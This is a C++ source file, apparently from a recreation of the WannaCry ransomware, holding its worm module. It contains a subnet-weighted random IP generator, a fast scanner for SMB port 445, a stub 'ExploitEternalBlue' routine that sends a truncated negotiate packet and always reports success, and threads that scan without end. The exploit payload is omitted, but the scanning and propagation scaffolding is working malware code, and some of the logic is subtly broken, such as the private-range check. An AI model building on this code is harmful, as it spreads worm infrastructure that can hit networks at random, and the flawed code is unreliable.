/**
 * wannacry_worm.cpp - SMB Worm Propagation (EternalBlue Simulation)
 * Simulates the MS17-010 exploit structure without actual exploitation
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include "wannacry_config.h"
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#endif

/**
 * Generate random IP addresses for scanning [citation:8]
 * WannaCry generates both local and global IP ranges
 */
DWORD GenerateRandomIP() {
    // WannaCry prioritizes local subnet
    DWORD localIp = 0;
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* he = gethostbyname(hostname);
    if (he && he->h_addr_list[0]) {
        localIp = *(DWORD*)he->h_addr_list[0];
    }
    
    // 70% chance to attack local subnet, 30% random global
    if ((GetTickCount() % 100) < 70 && localIp != 0) {
        DWORD subnet = localIp & 0x0000FFFF;
        DWORD randomHost = (GetTickCount() * 1103515245 + 12345) & 0xFFFF;
        return subnet | (randomHost << 16);
    } else {
        // Generate random global IP (excluding reserved ranges)
        DWORD random = (GetTickCount() * 1103515245 + 12345) ^ GetCurrentProcessId();
        // Avoid 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
        if ((random & 0xFF) == 10) random += 0x01000000;
        return random;
    }
}

/**
 * Check if port 445 is open (SMB) [citation:8]
 */
BOOL IsSMBPortOpen(DWORD ipAddr) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return FALSE;
    
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(445);
    addr.sin_addr.s_addr = htonl(ipAddr);
    
    // Set non-blocking for fast scan
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    fd_set writeSet;
    FD_ZERO(&writeSet);
    FD_SET(sock, &writeSet);
    
    struct timeval tv = {0, 500000};  // 500ms timeout
    int result = select(0, NULL, &writeSet, NULL, &tv);
    
    closesocket(sock);
    return (result > 0);
}

/**
 * Simulate EternalBlue exploit attempt [citation:8]
 * Real exploit sends crafted SMB packets with shellcode
 */
BOOL ExploitEternalBlue(DWORD ipAddr) {
    // Real EternalBlue:
    // 1. SMB_COM_TRANSACTION2 request with malformed FEA list
    // 2. Overwrites SRVNET buffer to achieve kernel RCE
    // 3. Shellcode loads kernel DLL and executes payload
    
    // This simulation shows the structure without actual exploit code
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return FALSE;
    
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(445);
    addr.sin_addr.s_addr = htonl(ipAddr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(sock);
        return FALSE;
    }
    
    // SMB Negotiate Protocol Request
    BYTE smbNegotiate[] = {
        0x00, 0x00, 0x00, 0x54,  // NetBIOS length
        0xFF, 0x53, 0x4D, 0x42,  // SMB magic
        0x72,                     // Command: Negotiate
        // ... (truncated for brevity)
    };
    
    send(sock, (char*)smbNegotiate, sizeof(smbNegotiate), 0);
    
    // In real WannaCry:
    // - Multiple SMB packets are exchanged
    // - Final packet contains the EternalBlue trigger
    // - DoublePulsar backdoor installed
    
    BYTE response[4096];
    recv(sock, (char*)response, sizeof(response), 0);
    
    closesocket(sock);
    return TRUE;  // Simulate success
}

/**
 * Worm propagation thread [citation:8]
 * Continuously scans and exploits vulnerable hosts
 */
DWORD WINAPI WormPropagationThread(LPVOID lpParam) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    while (TRUE) {
        DWORD targetIP = GenerateRandomIP();
        
        if (IsSMBPortOpen(targetIP)) {
            // WannaCry checks for DOUBLEPULSAR backdoor first
            ExploitEternalBlue(targetIP);
        }
        
        // Rate limiting - real WannaCry scans aggressively
        Sleep(100);
    }
    
    WSACleanup();
    return 0;
}

/**
 * Start worm component
 */
void StartWormPropagation(int threadCount) {
    for (int i = 0; i < threadCount; i++) {
        HANDLE hThread = CreateThread(NULL, 0, WormPropagationThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}
